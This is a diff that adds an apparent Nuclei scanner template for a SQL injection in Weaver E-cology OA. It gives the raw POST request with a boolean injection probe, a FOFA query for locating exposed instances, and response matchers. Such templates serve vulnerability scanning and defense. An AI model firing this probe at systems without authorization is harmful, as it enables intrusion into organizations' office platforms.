@@ -1,0 +1,42 @@
+id: E-cology-CptDwrUtil_ifNewsCheckOutByCurrentUser_dwr-SQL
+info:
+  name: 泛微E-cology-CptDwrUtil_ifNewsCheckOutByCurrentUser_dwr-SQL注入漏洞
+  author: mhb17
+  severity: critical
+  description: description
+  reference:
+    - https://
+  metadata:
+    fofa-query: app="泛微-协同办公OA"
+  tags: sqli
+requests:
+  - raw:
+      - |-
+        POST /dwr/call/plaincall/CptDwrUtil.ifNewsCheckOutByCurrentUser.dwr HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko)Chrome/35.0.2117.157 Safari/537.36
+        Content-Length: 189
+        Accept-Encoding: gzip
+        Connection: close
+        Content-Type: text/plain
+
+        callCount=1
+        page=
+        httpSessionId=
+        scriptSessionId=
+        c0-scriptName=DocDwrUtil
+        c0-methodName=ifNewsCheckOutByCurrentUser
+        c0-id=0
+        c0-param0=string:1 and 1=1
+        c0-param1=string:1
+        batchId=0
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - remoteHandleCallback
+      - type: word
+        part: header
+        words:
+          - '200'
